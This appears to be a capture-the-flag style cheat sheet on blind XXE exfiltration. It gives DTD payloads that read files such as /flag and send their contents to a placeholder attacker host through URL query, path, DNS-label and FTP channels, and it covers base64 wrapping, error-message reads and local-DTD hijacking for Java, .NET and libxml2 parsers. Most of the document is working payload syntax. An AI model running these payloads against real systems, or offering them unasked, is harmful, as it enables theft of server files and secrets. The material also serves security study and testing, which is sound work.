# Blind Exfil — deep patterns beyond the standard DTD

## The standard chain — what it assumes

The classic `%file;`-in-URL DTD assumes: param-entities expand in an
external DTD + outbound HTTP reaches you + file content is URL-safe.

## When URL-unsafe content breaks the URL — the encode-in-DTD trick

File content with spaces/newlines/`/`/`?`/`&`/`#`/`%` breaks the
exfil URL — the fetch fails or the content truncates.

```dtd
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % w "<!ENTITY s SYSTEM 'http://YOU/?d=%f;'>">
%w;
```

PHP: wrap the read in `php://filter/convert.base64-encode` — the entity
value becomes URL-safe b64 — the URL survives, content decodes at the
listener.

## When no `php://filter` — the DNS-label channel

`http://%f;.YOUR-DNS/` — file content becomes a DNS label:
- only alnum+dash survive — spaces/specials break it
- but a SHORT flag/secret/token (a hex digest, a short password) carries
- the hit arrives as a DNS query — you don't even need HTTP egress —
  a listener on UDP 53 or a `dnschef`/`dnsbin`-style service catches it

For non-PHP stacks without URL-safe wrapping — DNS-label is the
fallback for short content.

## When the flag is multi-line — the chunked exfil

```dtd
<!ENTITY % f1 SYSTEM "file:///flag">
```

a file with newlines can't go in a URL at all — read it in-band via
`&f1;` if the response echoes it, OR read via error-channel
(`file:///nonexistent/%f1;` → FileNotFound URI), OR slice the file
with `php://filter`/`iconv` chains (PHP only).

## The path-vs-query-vs-host channels

```dtd
http://YOU/?d=%f;            — query — breaks on ?/&/space
http://YOU/%f;               — path — breaks on //, survives ?
http://%f;.YOU/              — DNS label — alnum+dash only, ≤63 chars
http://YOU/#%f;              — fragment — client-side only, never sent
```

Fragment is a trap — `#...` never reaches the wire — dead channel.

## The FTP channel — when HTTP is filtered

`ftp://YOU/%f;` — some resolvers fetch FTP — a raw FTP listener
captures the RETR/USER string — the exfil lands in the FTP command
line. Old-Java/libxml2 only.

## The "the URL is the length oracle" — leak the file size

Even if content can't carry, the URL length itself leaks info — a
`?d=<char>` vs `<two chars>` length distinction — a binary-search
oracle in the limit case.

## The "the listener is the evidence" — canary discipline

`oob_listener.py canary --base http://YOU/` — embeds a unique token —
the `hits` output proves YOUR payload fired, not a scanner.

## The local-DTD-hijack — zero-egress blind read

When no outbound path at all: redefine an entity inside a DTD already
on disk — `local-dtd-hijack.md` — the file content lands in the
parser's error message — in-band error-channel read with no egress.

## The error-channel blind read — FileNotFound carries content

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % e "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%f;'>">
%e;
%err;
```

`%err;` triggers a fetch of `file:///nonexistent/<file-content>` —
the "no such file" error includes the URI — the file content lands
verbatim in the error. Works on: Java (`FileNotFoundException`),
.NET (`DirectoryNotFoundException`), libxml2 (`failed to load`) —
`error-based.md`.

## Falsifiers

- `%d` external DTD never reaches you AND error-channel yields nothing
  AND `file:`-echo dead → blind channels closed → in-band or pivot
